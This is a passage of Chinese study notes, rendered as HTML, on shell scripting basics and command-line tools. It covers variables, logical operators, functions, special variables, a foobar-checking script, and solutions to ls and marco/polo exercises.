<div class="language-zsh highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#note-cs-tms-overview-and-shell-__codelineno-81-1"></a>cat<span class="w"> </span>/sys/class/power_supply/BAT1/capacity
</span></code></pre></div>
<blockquote>
<p>不同的系统文件名好像不一样，可以进到power_supply目录下找一下</p>
</blockquote></section><section class="print-page" id="note-cs-tms-shell-tools-and-scripts" heading-number="2.4.2.3"><h1 id="note-cs-tms-shell-tools-and-scripts-shell-tools">Shell tools<a class="headerlink" href="#note-cs-tms-shell-tools-and-scripts-shell-tools" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2151 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 105 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 9 分钟</p>
</div>
<h2 id="note-cs-tms-shell-tools-and-scripts-shell-programming">shell programming<a class="headerlink" href="#note-cs-tms-shell-tools-and-scripts-shell-programming" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-tms-shell-tools-and-scripts-_1">变量定义<a class="headerlink" href="#note-cs-tms-shell-tools-and-scripts-_1" title="Permanent link">&para;</a></h3>
<p>在shell中，变量定义使用等号<code>=</code>，等号两边不能有空格。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-0-1"></a><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;kailqq&quot;</span>
</span></code></pre></div>
然后使用<code>$</code>来引用变量。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-1-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$name</span>
</span></code></pre></div>
这将会输出<code>kailqq</code>。</p>
<p>但是如果变量名中包含空格，则需要使用引号。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-2-1"></a><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>kailqq
</span></code></pre></div>
<p>这将会报错，因为此时相当于我们在调用<code>name</code>这个命令，第一个参数是<code>=</code>，第二个参数是<code>kailqq</code></p>
<p>在<a href="#note-cs-tms-overview-and-shell">lec1</a>的作业中，提到了<code>""</code>和<code>''</code>的区别，<code>""</code>解析<code>$</code>符号.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-3-1"></a><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;kailqq&quot;</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-3-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$name</span><span class="s2">&quot;</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-3-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;$name&#39;</span>
</span></code></pre></div>
<p>第一个输出<code>kailqq</code>，第二个输出<code>$name</code>。</p>
<p>我们也可以将命令的输出赋值给变量。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-4-1"></a><span class="nv">directories</span><span class="o">=</span><span class="k">$(</span>ls<span class="k">)</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-4-2"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$directories</span>
</span></code></pre></div>
<p>这将会获取当前目录下的所有文件名，并赋值给变量<code>name</code>。<code>$()</code>也可以替换为<code>``</code></p>
<p>除了<code>$()</code>，还可以使用<code>&lt;()</code>将命令的输出作为标准输入传递给另一个命令。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-5-1"></a><span class="o">[</span>command<span class="o">]</span><span class="w"> </span>&lt;<span class="o">(</span>command_1<span class="o">)</span><span class="w"> </span>&lt;<span class="o">(</span>command_2<span class="o">)</span>
</span></code></pre></div>
<p>这将会先执行<code>command_1</code>，输出结果传递给<code>command</code>，然后执行<code>command_2</code>，输出结果也传递给<code>command</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-6-1"></a>cat<span class="w"> </span>&lt;<span class="o">(</span>ls<span class="o">)</span><span class="w"> </span>&lt;<span class="o">(</span>ls<span class="w"> </span>-l<span class="o">)</span>
</span></code></pre></div>
<p>这将会输出当前目录下的所有文件名和文件的详细信息。</p>
<h3 id="note-cs-tms-shell-tools-and-scripts-_2">逻辑运算符<a class="headerlink" href="#note-cs-tms-shell-tools-and-scripts-_2" title="Permanent link">&para;</a></h3>
<p><code>true</code> 表示真，执行<code>true</code>，后执行<code>echo $?</code>，输出0。</p>
<p><code>false</code> 表示假，执行<code>false</code>，后执行<code>echo $?</code>，输出1。</p>
<p><code>||</code> 表示或，只有当第一个命令失败时，才会执行第二个命令。(遇到第一个成功的命令结束)</p>
<p><code>&amp;&amp;</code> 表示与，只有当第一个命令成功时，才会执行第二个命令。(遇到第一个失败的命令结束)</p>
<p><code>;</code> 表示分隔符，用于分隔多个命令，不管上一个命令是否成功，都会执行下一个命令。</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-7-1"></a><span class="nb">false</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;hello&quot;</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-7-2"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span>
</span></code></pre></div>
<p>第一行第一个命令失败，执行第二个命令成功，输出<code>hello</code>和<code>0</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-8-1"></a><span class="nb">true</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;hello&quot;</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-8-2"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span>
</span></code></pre></div>
<p>第一行第一个命令成功，不执行第二个命令，输出<code>0</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-9-1"></a><span class="nb">false</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;hello&quot;</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-9-2"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span>
</span></code></pre></div>
<p>第一行第一个命令失败，不执行第二个命令，输出<code>1</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-10-1"></a><span class="nb">true</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">false</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-10-2"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span>
</span></code></pre></div>
<p>第一行第一个命令成功，执行第二个命令失败，输出<code>1</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-11-1"></a><span class="nb">false</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-11-2"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span>
</span></code></pre></div>
<p>第一行第一个命令失败，执行第二个命令成功，输出<code>0</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-12-1"></a><span class="nb">false</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span>
</span></code></pre></div>
<p>执行第二个命令时，由于它的前一个命令失败，所以输出<code>1</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-13-1"></a><span class="nb">true</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span>
</span></code></pre></div>
<p>执行第二个命令时，由于它的前一个命令成功，所以输出<code>0</code>。</p>
</div>
<h3 id="note-cs-tms-shell-tools-and-scripts-_3">函数<a class="headerlink" href="#note-cs-tms-shell-tools-and-scripts-_3" title="Permanent link">&para;</a></h3>
<p>首先创建一个函数</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-14-1"></a>code<span class="w"> </span>mcd.sh
</span></code></pre></div>
<p>输入</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-15-1"></a>mcd<span class="o">(){</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-15-2"></a><span class="w">    </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-15-3"></a><span class="w">    </span><span class="nb">cd</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-15-4"></a><span class="o">}</span>
</span></code></pre></div>
<p>然后保存文件，并<code>source</code>这个文件。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-16-1"></a><span class="nb">source</span><span class="w"> </span>mcd.sh
</span></code></pre></div>
<p>然后就可以使用这个函数了
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-17-1"></a>mcd<span class="w"> </span><span class="nb">test</span>
</span></code></pre></div></p>
<p>这会在当前目录下创建一个名为<code>test</code>的目录，并进入该目录。</p>
<div class="admonition note">
<p class="admonition-title">分析</p>
<p><code>mkdir -p "$1"</code>: 这个命令用于创建目录。<code>-p</code> 选项告诉 <code>mkdir</code> 创建所需的父目录，这意味着如果目录已经存在，它不会报错。<code>$1</code> 是一个位置参数，表示传递给函数的第一个参数。因此，如果你调用 <code>mcd test</code>，<code>$1</code> 就是 <code>test</code>。</p>
<p>而<code>source</code>命令用于读取并执行指定文件中的命令。在这个例子中，<code>source mcd.sh</code> 读取 <code>mcd.sh</code> 文件中的命令，并执行它们。</p>
<p>使得<code>mcd</code>命令在当前shell中可用。</p>
<p><code>$0</code> 是一个特殊变量，表示当前脚本的名称。</p>
<p><code>$i</code> 是一个位置参数，表示传递给函数的第i个参数。</p>
<p>其中<code>$1</code>表示第一个参数，<code>$2</code>表示第二个参数，以此类推。</p>
<p><code>$?</code> 是一个特殊变量，表示上一个命令的退出状态,0表示成功，1表示error,执行命令后可以通过<code>echo $?</code>查看是否成功。</p>
<p><code>$_</code> 是一个特殊变量，表示上一个命令的最后一个参数。</p>
<p><code>$$</code> 是一个特殊变量，表示当前进程的进程ID(PID)。</p>
<p><code>$#</code> 是一个特殊变量，表示传递给函数的参数个数。</p>
<p><code>!!</code> 是一个特殊变量，表示上一条命令。(Bang Bang)</p>
</div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-1"></a><span class="ch">#!/bin/zsh</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Starting program at </span><span class="k">$(</span>date<span class="k">)</span><span class="s2">&quot;</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-3"></a>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Running Program </span><span class="nv">$0</span><span class="s2"> with </span><span class="nv">$#</span><span class="s2"> arguments with pid </span><span class="nv">$$</span><span class="s2">&quot;</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-5"></a>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-6"></a><span class="k">for</span><span class="w"> </span>file<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-7"></a><span class="w">    </span>grep<span class="w"> </span>foobar<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-8"></a>
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$?</span><span class="s2">&quot;</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-10"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;File </span><span class="nv">$file</span><span class="s2"> does not have any foobar,add one&quot;</span>
</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-11"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;#foobar&quot;</span>&gt;&gt;<span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span>
</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-12"></a><span class="w">    </span><span class="k">fi</span>
</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-18-13"></a><span class="k">done</span>
</span></code></pre></div>
<p>如果没有第一行的shebang，则会报错找不到<code>[[</code></p>
<p>因为shebang指定了脚本的解释器，所以需要使用<code>#!/bin/zsh</code>或者<code>#!/bin/bash</code>。使用<code>#!/bin/sh</code>也不行.</p>
<p><strong><code>echo "Starting program at $(date)"</code></strong>:</p>
<ul>
<li>输出当前程序的启动时间。<code>$(date)</code> 执行 <code>date</code> 命令并将其输出插入到字符串中。</li>
</ul>
<p><strong><code>echo "Running Program $0 with $# arguments with pid $$"</code></strong>:</p>
<ul>
<li>输出当前正在运行的程序名（<code>$0</code>），传递给程序的参数个数（<code>$#</code>），以及当前进程的进程 ID（<code>$$</code>）。</li>
</ul>
<p><strong><code>for file in "$@"; do</code></strong>:</p>
<ul>
<li>开始一个循环，遍历传递给脚本的所有参数（文件名）。<code>"$@"</code> 表示所有传递的参数，每个参数作为一个独立的字符串。</li>
</ul>
<p><strong><code>grep foobar "$file" &gt; /dev/null 2&gt; /dev/null</code></strong>:</p>
<ul>
<li>在当前文件中搜索字符串 "foobar"。<code>&gt; /dev/null</code> 和 <code>2&gt; /dev/null</code> 将标准输出和标准错误输出重定向到 <code>/dev/null</code>，即忽略输出。</li>
</ul>
<p><strong><code>if [[ "$?" -ne 0 ]]; then</code></strong>:</p>
<ul>
<li>检查上一个命令的退出状态（<code>$?</code>）。如果 <code>grep</code> 没有找到 "foobar"，退出状态将不为 0，表示失败。</li>
</ul>
<p><strong><code>echo "File $file does not have any foobar,add one"</code></strong>:</p>
<ul>
<li>输出一条信息，说明文件中没有找到 "foobar"。</li>
</ul>
<p><strong><code>echo "#foobar"&gt;&gt;"$file"</code></strong>:</p>
<ul>
<li>将字符串 <code>#foobar</code> 追加到文件的末尾。</li>
</ul>
<p><strong><code>done</code></strong>:</p>
<ul>
<li>结束 <code>for</code> 循环。</li>
</ul>
<p>使用<code>./foobarchecker</code>运行脚本，并传递参数<code>file1.txt file2.txt file3.txt</code>。
甚至可以不传递参数，直接运行<code>./foobarchecker foobarchecker</code>，来检查当前脚本是否包含<code>foobar</code>。</p>
<h2 id="note-cs-tms-shell-tools-and-scripts-shell-tools_1">shell-tools<a class="headerlink" href="#note-cs-tms-shell-tools-and-scripts-shell-tools_1" title="Permanent link">&para;</a></h2>
<hr />
<p>检查脚本语法可以使用<code>shellcheck</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-19-1"></a>shellcheck<span class="w"> </span>foobarchecker
</span></code></pre></div>
<hr />
<p><code>tldr</code> 是一个社区驱动的命令行工具，旨在提供简洁明了的命令行工具使用示例。它的名字来源于 "Too Long; Didn't Read"，意在为用户提供简化的命令行工具文档，帮助快速理解和使用命令。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-20-1"></a>tldr<span class="w"> </span>ls
</span></code></pre></div>
<hr />
<p><code>ripgrep</code> 是一个用于搜索文本的工具，类似于 <code>grep</code>，但提供了更快的搜索速度和更丰富的功能。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-21-1"></a>rg<span class="w"> </span>--help
</span></code></pre></div>
<hr />
<p><code>history</code> 是一个用于显示命令历史的工具。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-22-1"></a><span class="nb">history</span>
</span></code></pre></div>
<hr />
<p><code>autojump</code> 是一个用于快速跳转目录的工具。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-23-1"></a>j<span class="w"> </span><span class="nb">test</span>
</span></code></pre></div>
<hr />
<p><code>fzf</code> 是一个用于模糊搜索的工具。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-24-1"></a>cat<span class="w"> </span>text.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>fzf
</span></code></pre></div>
<p>这会进入到一个交互式搜索界面，搜索文件内容时很有帮助</p>
<p>如果启用了绑定键，则可以按下<code>Ctrl+R</code>来搜索命令历史。</p>
<p>如果直接使用<code>fzf</code>，则进入交互式寻找当前目录下文件。</p>
<hr />
<p><code>tree</code> 是一个用于显示目录树的工具,功能类似于<code>ls -R</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-25-1"></a>tree
</span></code></pre></div>
<p><code>broot</code>可以进入交互式文件导航</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-26-1"></a>broot
</span></code></pre></div>
<hr />
<h2 id="note-cs-tms-shell-tools-and-scripts-exercise-solutions">Exercise &amp; Solutions<a class="headerlink" href="#note-cs-tms-shell-tools-and-scripts-exercise-solutions" title="Permanent link">&para;</a></h2>
<ol>
<li>
<p>Read <code>man ls</code> and write an <code>ls</code> command that lists files in the following manner:</p>
</li>
<li>
<p>Includes all files, including hidden files</p>
</li>
<li>Sizes are listed in human readable format (e.g. 454M instead of 454279954)</li>
<li>Files are ordered by recency</li>
<li>Output is colorized</li>
</ol>
<p>A sample output would look like this</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-27-1"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>user<span class="w"> </span>group<span class="w"> </span><span class="m">1</span>.1M<span class="w"> </span>Jan<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">09</span>:53<span class="w"> </span>baz
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-27-2"></a>drwxr-xr-x<span class="w">  </span><span class="m">5</span><span class="w"> </span>user<span class="w"> </span>group<span class="w"> </span><span class="m">160</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">09</span>:53<span class="w"> </span>.
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-27-3"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>user<span class="w"> </span>group<span class="w"> </span><span class="m">514</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">06</span>:42<span class="w"> </span>bar
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-27-4"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>user<span class="w"> </span>group<span class="w"> </span>106M<span class="w"> </span>Jan<span class="w"> </span><span class="m">13</span><span class="w"> </span><span class="m">12</span>:12<span class="w"> </span>foo
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-27-5"></a>drwx------<span class="w"> </span><span class="m">47</span><span class="w"> </span>user<span class="w"> </span>group<span class="w"> </span><span class="m">1</span>.5K<span class="w"> </span>Jan<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">18</span>:08<span class="w"> </span>..
</span></code></pre></div>
<p>即要求输出文件详细信息，size以人类可读格式显示，文件按最近修改时间排序，并启用彩色输出。</p>
<p><code>-l</code> 参数可以显示文件的详细信息</p>
<p><code>-a</code> 参数可以显示隐藏文件</p>
<p><code>-h</code> 参数可以以人类可读格式显示文件大小</p>
<p><code>--color=auto</code> 参数可以启用彩色输出</p>
<p><code>--sort=time</code> 参数可以按最近修改时间排序</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-28-1"></a>ls<span class="w"> </span>-lah<span class="w"> </span>--color<span class="o">=</span>auto<span class="w"> </span>--sort<span class="o">=</span><span class="nb">time</span>
</span></code></pre></div>
<ol>
<li>Write bash functions <code>marco</code> and <code>polo</code> that do the following. Whenever you execute <code>marco</code> the current working directory should be saved in some manner, then when you execute <code>polo</code>, no matter what directory you are in, <code>polo</code> should <code>cd</code> you back to the directory where you executed <code>marco</code>. For ease of debugging you can write the code in a file <code>marco.sh</code> and (re)load the definitions to your shell by executing <code>source marco.sh</code>.</li>
</ol>
<p>即要求<code>marco</code>保存当前工作目录，<code>polo</code>返回<code>marco</code>保存的工作目录。</p>
<p>考虑到可以进行变量定义，所以<code>macro</code>只需要定义一个保存当前目录的变量，<code>polo</code>只需要<code>cd</code>到这个变量定义的目录。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-29-1"></a>marco<span class="o">(){</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-29-2"></a><span class="w">    </span><span class="nv">MARCO_DIR</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-29-3"></a><span class="o">}</span>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-29-4"></a>
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-29-5"></a>polo<span class="o">(){</span>
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-29-6"></a><span class="w">    </span><span class="nb">cd</span><span class="w"> </span><span class="nv">$MARCO_DIR</span>
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-29-7"></a><span class="o">}</span>
</span></code></pre></div>
<p>也可以在<code>marco</code>中使用<code>export MARCO_DIR=$(pwd)</code>来定义变量,<code>export</code>定义的变量是全局变量，可以在子进程中使用</p>
